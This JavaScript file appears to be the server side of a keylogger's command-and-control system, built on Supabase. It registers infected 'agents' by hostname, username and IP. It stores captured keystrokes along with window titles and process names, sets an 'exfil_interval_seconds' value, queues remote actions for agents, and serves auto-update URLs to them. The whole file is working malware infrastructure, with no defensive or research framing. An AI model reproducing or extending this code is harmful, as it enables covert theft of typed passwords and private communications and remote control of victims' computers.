import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY
);

const CORS_HEADERS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "Content-Type",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
};

function json(data, status = 200) {
  return {
    statusCode: status,
    headers: { ...CORS_HEADERS, "Content-Type": "application/json" },
    body: JSON.stringify(data),
  };
}

/* ── Routing ── */

export async function handler(event) {
  if (event.httpMethod === "OPTIONS") return { statusCode: 204, headers: CORS_HEADERS };

  const method = event.httpMethod;
  const parts = event.path.replace(/^\/api\//, "").split("/").filter(Boolean);
  const body = event.body ? JSON.parse(event.body) : {};
  const query = event.queryStringParameters || {};

  try {
    return await route(method, parts, body, query);
  } catch (err) {
    console.error("api error:", err);
    return json({ error: err.message }, 500);
  }
}

/* ── Route dispatcher ── */

async function route(method, parts, body, query) {
  const [resource, ...rest] = parts;

  switch (resource) {
    /* ── Agents ── */

    case "agents": {
      if (method === "POST" && rest[0] === "register")
        return handleRegister(body);
      if (method === "POST" && rest[0] === "heartbeat")
        return handleHeartbeat(body);
      if (method === "GET" && rest.length === 1 && rest[0] !== "config")
        return handleGetAgent(rest[0]);
      if (method === "GET" && rest.length === 0)
        return handleListAgents(query);
      if (method === "DELETE" && rest.length === 1)
        return handleDeleteAgent(rest[0]);

      /* agents/:id/* sub-routes */
      const [agentId, sub] = rest;
      if (!agentId) return json({ error: "agent_id required" }, 400);

      if (sub === "config" && method === "GET")
        return handleGetConfig(agentId);
      if (sub === "config" && method === "PUT")
        return handleUpdateConfig(agentId, body);
      if (sub === "action" && method === "POST")
        return handleAgentAction(agentId, body);
      if (sub === "keystrokes" && method === "GET")
        return handleGetAgentKeystrokes(agentId, query);
      if (sub === "activity" && method === "GET")
        return handleGetActivity(agentId);

      return json({ error: "not found" }, 404);
    }

    /* ── Keystrokes ── */

    case "keystrokes": {
      if (method === "POST") return handlePostKeystrokes(body);
      if (method === "GET") return handleListKeystrokes(query);
      return json({ error: "method not allowed" }, 405);
    }

    case "releases": {
      if (method === "POST") return handleCreateRelease(body);
      if (method === "GET") return handleListReleases();
      return json({ error: "method not allowed" }, 405);
    }

    default:
      return json({ error: "not found" }, 404);
  }
}

/* ── Releases ── */

async function handleCreateRelease(body) {
  const { version, update_url, update_sha256 } = body;
  if (!version || !update_url || !update_sha256) {
    return json({ error: "version, update_url, update_sha256 required" }, 400);
  }

  const { data, error } = await supabase
    .from("agent_releases")
    .insert({ version, update_url, update_sha256 })
    .select()
    .single();

  if (error) throw error;
  return json(data, 201);
}

async function handleListReleases() {
  const { data, error } = await supabase
    .from("agent_releases")
    .select("*")
    .order("created_at", { ascending: false });

  if (error) throw error;
  return json(data || []);
}

/* ── Handlers ── */

async function handleRegister(body) {
  const { hostname, username, os_version, ip_address, architecture } = body;

  const { data, error } = await supabase
    .from("agents")
    .insert({
      hostname,
      username,
      os: os_version || architecture || "Windows x64",
      ip: ip_address,
      status: "active",
      last_seen_utc: new Date().toISOString(),
      activity_history: new Array(24).fill(0),
    })
    .select()
    .single();

  if (error) throw error;

  return json({
    agent_id: data.id,
    exfil_interval_seconds: 30,
    heartbeat_interval_seconds: 60,
    config_poll_interval_seconds: 300,
  }, 201);
}

async function handleHeartbeat(body) {
  const { agent_id, version, keystrokes_since_last, uptime_seconds, status } = body;

  /* Update last_seen, version, and status */
  const updates = {
    last_seen_utc: new Date().toISOString(),
    status: status || "active",
  };
  if (version) updates.version = version;
  await supabase.from("agents").update(updates).eq("id", agent_id);

  /* Check for config or update */
  const { data: config } = await supabase
    .from("agent_configs")
    .select("*")
    .eq("agent_id", agent_id)
    .single();

  const response = { status: "ok" };

  if (config) {
    response.config_changed = true;
  }

  /* Auto-update: check if agent version is stale */
  const { data: release } = await supabase
    .from("agent_releases")
    .select("version, update_url, update_sha256")
    .order("created_at", { ascending: false })
    .limit(1)
    .single();

  if (release && release.update_sha256 && version !== release.version) {
    response.update_url = release.update_url;
    response.update_sha256 = release.update_sha256;
  }

  return json(response);
}

async function handleListAgents(query) {
  let q = supabase.from("agents").select("*");

  if (query.status) q = q.eq("status", query.status);
  q = q.order("last_seen_utc", { ascending: false });

  const { data, error } = await q;
  if (error) throw error;

  /* fetch latest release version for color-coded version display */
  let latest_version = null;
  const { data: release } = await supabase
    .from("agent_releases")
    .select("version")
    .order("created_at", { ascending: false })
    .limit(1)
    .single();
  if (release) latest_version = release.version;

  return json({ agents: data || [], latest_version });
}

async function handleGetAgent(id) {
  const { data, error } = await supabase
    .from("agents")
    .select("*")
    .eq("id", id)
    .single();

  if (error) {
    if (error.code === "PGRST116") return json({ error: "not found" }, 404);
    throw error;
  }
  return json(data);
}

async function handleDeleteAgent(id) {
  /* cascade: remove keystrokes, configs, actions, then the agent */
  await supabase.from("keystrokes").delete().eq("agent_id", id);
  await supabase.from("agent_configs").delete().eq("agent_id", id);
  await supabase.from("agent_actions").delete().eq("agent_id", id);
  const { error } = await supabase.from("agents").delete().eq("id", id);
  if (error) throw error;
  return json({ status: "deleted" });
}

async function handleGetConfig(agentId) {
  const { data, error } = await supabase
    .from("agent_configs")
    .select("*")
    .eq("agent_id", agentId)
    .single();

  if (error && error.code !== "PGRST116") throw error;

  return json(
    data || {
      exfil_interval_seconds: 30,
      heartbeat_interval_seconds: 60,
      blacklist: [],
      enabled: true,
    }
  );
}

async function handleUpdateConfig(agentId, body) {
  const payload = {};
  if (body.exfil_interval_seconds !== undefined)
    payload.exfil_interval_seconds = body.exfil_interval_seconds;
  if (body.blacklist !== undefined) payload.blacklist = body.blacklist;
  if (body.enabled !== undefined) payload.enabled = body.enabled;
  payload.updated_at = new Date().toISOString();

  /* Upsert: create if not exists */
  const { data, error } = await supabase
    .from("agent_configs")
    .upsert({ agent_id: agentId, ...payload })
    .select()
    .single();

  if (error) throw error;
  return json(data);
}

async function handleAgentAction(agentId, body) {
  /* Store the action; agent picks it up on next heartbeat */
  await supabase
    .from("agent_actions")
    .insert({
      agent_id: agentId,
      action: body.action,
      created_at: new Date().toISOString(),
    });

  return json({ status: "queued" });
}

async function handlePostKeystrokes(body) {
  const { agent_id, events } = body;

  if (!events || !Array.isArray(events) || events.length === 0) {
    return json({ error: "no events" }, 400);
  }

  const rows = events.map((e) => ({
    agent_id,
    timestamp_utc: e.timestamp_utc || new Date().toISOString(),
    window_title: e.window_title || "",
    process_name: e.process_name || "",
    key_char: e.key_char || "",
    vk_code: e.vk_code || null,
    flags: e.flags || null,
  }));

  const { error } = await supabase.from("keystrokes").insert(rows);

  if (error) throw error;

  /* Update agent keystroke count + activity_history */
  const hour = new Date().getUTCHours();
  const agent = await supabase.from("agents").select("keystroke_count, activity_history").eq("id", agent_id).single();
  if (agent.data) {
    const history = agent.data.activity_history || new Array(24).fill(0);
    history[hour] = (history[hour] || 0) + rows.length;
    await supabase
      .from("agents")
      .update({
        keystroke_count: (agent.data.keystroke_count || 0) + rows.length,
        activity_history: history,
        last_seen_utc: new Date().toISOString(),
      })
      .eq("id", agent_id);
  }

  return json({ status: "ok" }, 201);
}

async function handleListKeystrokes(query) {
  let q = supabase.from("keystrokes")
    .select("id, agent_id, timestamp_utc, window_title, process_name, key_char, agents!inner(hostname)")
    .order("timestamp_utc", { ascending: false });

  if (query.since) q = q.gte("timestamp_utc", query.since);
  if (query.search) q = q.ilike("window_title", `%${query.search}%`);
  if (query.agent_id) q = q.eq("agent_id", query.agent_id);
  if (query.limit) q = q.limit(Math.min(parseInt(query.limit), 500));
  else q = q.limit(100);

  const { data, error } = await q;
  if (error) throw error;

  /* Flatten: return agent_hostname from joined relation */
  return json((data || []).map((k) => ({
    id: k.id,
    agent_id: k.agent_id,
    agent_hostname: k.agents?.hostname || "unknown",
    timestamp_utc: k.timestamp_utc,
    window_title: k.window_title,
    process_name: k.process_name,
    key_char: k.key_char,
  })));
}

async function handleGetAgentKeystrokes(agentId, query) {
  let q = supabase
    .from("keystrokes")
    .select("id, agent_id, timestamp_utc, window_title, process_name, key_char")
    .eq("agent_id", agentId)
    .order("timestamp_utc", { ascending: false });

  if (query.since) q = q.gte("timestamp_utc", query.since);
  if (query.limit) q = q.limit(Math.min(parseInt(query.limit), 500));
  else q = q.limit(200);

  const { data, error } = await q;
  if (error) throw error;

  return json(data || []);
}

async function handleGetActivity(agentId) {
  const { data, error } = await supabase
    .from("agents")
    .select("activity_history, last_seen_utc")
    .eq("id", agentId)
    .single();

  if (error) {
    if (error.code === "PGRST116") return json({ error: "not found" }, 404);
    throw error;
  }

  const history = data.activity_history || new Array(24).fill(0);
  const now = new Date();

  return json(
    history.map((val, i) => {
      const h = new Date(now);
      h.setHours(now.getHours() - (history.length - 1) + i);
      return {
        hour: `${h.getHours().toString().padStart(2, "0")}:00`,
        keystrokes: val,
      };
    })
  );
}
